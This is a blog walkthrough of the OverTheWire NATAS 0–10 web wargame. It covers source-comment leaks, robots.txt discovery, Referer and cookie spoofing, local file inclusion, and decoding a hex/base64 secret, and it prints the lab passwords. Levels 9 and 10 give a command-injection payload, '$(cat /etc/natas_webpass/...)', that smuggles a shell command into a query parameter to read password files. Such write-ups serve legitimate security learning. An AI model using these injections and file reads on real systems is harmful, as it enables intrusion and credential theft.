---
title: 'OverTheWire: NATAS 0 &#8211; 10'
date: 2019-09-10T15:55:39-04:00
categories: [Walkthrough, OverTheWire]
tags: [web]
---
### LEVEL 0

The password for the next level is embedded in the HTML source code as a comment.

`<!–The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto –>`

&nbsp;

### LEVEL 1

> You can find the password for the next level on this page, but rightclicking has been blocked!

Press &#8220;ALT&#8221; button to get to the menu if it isn&#8217;t visible, then go to &#8220;Tools -> Web Developer Menu&#8221; and view the Page Source.

`<!–The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi –>`

&nbsp;

### LEVEL 2

> There is nothing on this page

Looking into the page source, you can see an image &#8220;files/pixel.png&#8221;.

If you browse to the &#8220;files&#8221; directory, it is open for viewing and there&#8217;s another file called &#8220;users.txt&#8221; where you&#8217;ll find the next password.

{%highlight plain_text%}
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
{%endhighlight%}

&nbsp;

### LEVEL 3

> There is nothing on this page

Looking in the page source, you&#8217;ll see <span class="lang:xhtml decode:true crayon-inline "><!&#8211; No more information leaks!! Not even Google will find it this time&#8230; &#8211;></span> . That makes me think they&#8217;re trying to block Google&#8217;s web crawler&#8217;s from picking up something. It&#8217;s a well known flaw to have secret things listed in the &#8220;robots.txt&#8221; file that web crawlers look for, so take a look there.

Voila!

{%highlight plain_text%}
User-agent: *
Disallow: /s3cr3t/
{%endhighlight%}

In the &#8220;s3cr3t&#8221; directory, there&#8217;s a &#8220;users.txt&#8221; file with the next credentials.

`natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

&nbsp;

### LEVEL 4

> Access disallowed. You are visiting from &#8220;&#8221; while authorized users should come only from &#8220;http://natas5.natas.labs.overthewire.org/&#8221;

This makes me think it&#8217;s checking the referrer to see what page we&#8217;re coming from.

To edit HTTP headers and other changes, I like to use Burp Suite, which is purpose built for testing websites.

Using Burp, view the headers on the request and see what the referrer is. Mine didn&#8217;t have a referrer, so that explains the blank quotes on the page.

I added a referrer like so:

{%highlight plain_text%}
GET / HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: __cfduid=d36afe6edde0ea62a428daa5ba6f1cc781568143940
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Referer: http://natas4.natas.labs.overthewire.org
{%endhighlight%}

and it showed up on the page as:

> Access disallowed. You are visiting from &#8220;http://natas4.natas.labs.overthewire.org&#8221; while authorized users should come only from &#8220;http://natas5.natas.labs.overthewire.org/&#8221;

So I changed the referrer address to http://natas5.natas.labs.overthewire.org/ and it worked!

> Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

&nbsp;

### LEVEL 5

> Access disallowed. You are not logged in

The page source on this one shows nothing. However, the response HTTP headers do show something interesting:

{%highlight plain_text%}
HTTP/1.1 200 OK
Date: Tue, 10 Sep 2019 20:18:26 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: loggedin=0
Vary: Accept-Encoding
Content-Length: 855
Connection: close
Content-Type: text/html; charset=UTF-8
{%endhighlight%}

It sets a cookie &#8220;loggedin&#8221; to &#8220;0&#8221;. If we change that cookie value to &#8220;1&#8221; it will probably trick the site into thinking we are logged in and can access the content.

I used the Web Developer Tools in the browser to change the cookie and then refreshed the page to get the next password.

> Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

&nbsp;

### LEVEL 6

<img class="alignnone size-full wp-image-212" src="/assets/img/2019/09/level6.png" /> 

When viewing the sourcecode using the link provided, you&#8217;ll notice some PHP code:

{%highlight php%}
<?
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is &lt;censored&gt;";
    } else {
        print "Wrong secret";
    }
    }
?>
{%endhighlight%}

The PHP code is looking at an included file called &#8220;secret.inc&#8221; and checking it against what we&#8217;re entering in the input form. Browsing to the included file at &#8220;/includes/secret.inc&#8221; gives us the secret.

{% highlight php %}
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
{% endhighlight %}

When you put that secret string into the Input box, it gives you the password for the next level.

> Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

&nbsp;

### LEVEL 7

<img class="alignnone size-full wp-image-214" src="/assets/img/2019/09/2019-09-11_09h36_35.png" alt="" width="607" height="136" srcset="/assets/img/2019/09/2019-09-11_09h36_35.png 607w, /assets/img/2019/09/2019-09-11_09h36_35-300x67.png 300w" sizes="(max-width: 607px) 100vw, 607px" /> 

This level gives us two pages we can browse to, &#8220;Home&#8221; and &#8220;About&#8221;. They&#8217;re equally boring and probably not worth clicking on. What is worth investigating is the page source however. There you&#8217;ll see:

`<!– hint: password for webuser natas8 is in /etc/natas_webpass/natas8 –>`

That suggests to solve this level, we will need to pull a file from the server. Local File Include vulnerability maybe? In the page source, the links to &#8220;Home&#8221; and &#8220;About&#8221; show a PHP script is being called to serve them, by passing &#8220;page=&#8221; to &#8220;index.php&#8221;. Putting in the path to the webpass file into the &#8220;page&#8221; variable will probably give us the password.

Sure enough, it does!

<img class="alignnone wp-image-215 size-full" src="/assets/img/2019/09/2019-09-11_09h53_24.png" alt="" width="1029" height="297" srcset="/assets/img/2019/09/2019-09-11_09h53_24.png 1029w, /assets/img/2019/09/2019-09-11_09h53_24-300x87.png 300w, /assets/img/2019/09/2019-09-11_09h53_24-768x222.png 768w, /assets/img/2019/09/2019-09-11_09h53_24-1024x296.png 1024w" sizes="(max-width: 1029px) 100vw, 1029px" /> 

&nbsp;

### LEVEL 8

<img class="alignnone size-full wp-image-212" src="/assets/img/2019/09/level6.png" alt="" width="601" height="191" srcset="/assets/img/2019/09/level6.png 601w, /assets/img/2019/09/level6-300x95.png 300w" sizes="(max-width: 601px) 100vw, 601px" /> 

This is another secret sauce input box. Glad they have that sourcecode button or these might really be hard.

There is PHP code in the source on this one as well:

{% highlight php %}
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is &lt;censored&gt;";
    } else {
    print "Wrong secret";
    }
}
?>
{% endhighlight %}

Notice this part:

`return bin2hex(strrev(base64_encode($secret)));`

It is taking the secret string, base64 encoding it, then reversing the letters, then hex encoding the characters. So to get the original string, we only have to do the exact opposite!

To decode the Secret from hex back to ASCII, use the &#8220;XXD&#8221; command like so:

`echo -n "3d3d516343746d4d6d6c315669563362" | xxd -r -ps`

The &#8220;rev&#8221; command will reverse the string.

And lastly, the &#8220;base64&#8221; command will decode it to it&#8217;s original form. Putting all of this together looks like this:

`echo -n “3d3d516343746d4d6d6c315669563362” | xxd -r -ps | rev | base64 -d`

Take the result and submit it in the form to get the next password!

&nbsp;

### LEVEL 9

<img class="alignnone size-full wp-image-216" src="/assets/img/2019/09/2019-09-11_12h10_30.png" /> 

The PHP code in this page is:

{% highlight php %}
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
{% endhighlight %}

So this code is taking our input variable &#8220;needle&#8221; and passing it&#8217;s value to &#8220;grep&#8221;, which looks up the value in a dictionary file, then returns the result.

We can exploit an injection here, with command substitution. Using a &#8220;$()&#8221; string will execute whatever is inside the parentheses. Since the rules of the NATAS say that all passwords are stored in &#8220;/etc/natas_webpass/&#8221;, we can use the injection to read out the file we need.

If we read out the file by using &#8220;cat&#8221;, like `?needle=$(cat /etc/natas_webpass/natas10)` it won&#8217;t return anything since that isn&#8217;t in the dictionary file. We could make a script that looks up each character in the password with an &#8220;if&#8221; statement, showing dictionary results only when we get a match, one character at a time. Pretty sure that&#8217;s the way this level was intended to be solved&#8230;

But there is a _better_ way. What if I told you we could use the bash command substitution to forcefully inject the password into the PHP script&#8217;s output? I tried a bunch of things, and eventually found that we can inject straight into the output file descriptor for the PHP script. We have to get the Process ID of the PHP script, and bash makes it easy for us by designating a variable for the current PID, &#8220;$$&#8221;.

So the command become something like `cat /etc/natas_webpass/natas10 1> /proc/$$/fd/1` where &#8220;1>&#8221; is redirecting output and &#8220;/proc/$$/fd/1&#8221; is the output file descriptor for the current process. To send it to the PHP script, type this into the address bar: `?needle=$(cat+/etc/natas_webpass/natas10+1>+/proc/$$/fd/1)`

<img class="alignnone size-full wp-image-217" src="/assets/img/2019/09/2019-09-11_13h40_47.png" /> 

This is the coolest solution I came up with for the whole NATAS site!

&nbsp;

### LEVEL 10

<img class="alignnone size-full wp-image-219" src="/assets/img/2019/09/2019-09-11_13h51_21.png" /> 

Oh great, a character filter! Looking into the sourcecode we can see which characters are bad:

{% highlight php %}
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
{% endhighlight %}

The characters &#8220;&#59; &#124; &#38;&#8221; can&#8217;t be used now. No problem, our last solution doesn&#8217;t use any of those! Lol, just send the same request as the last level, modified to get the correct password file of course.

<img class="alignnone size-full wp-image-220" src="/assets/img/2019/09/2019-09-11_13h56_19.png" /> 

Boom! Gotcha.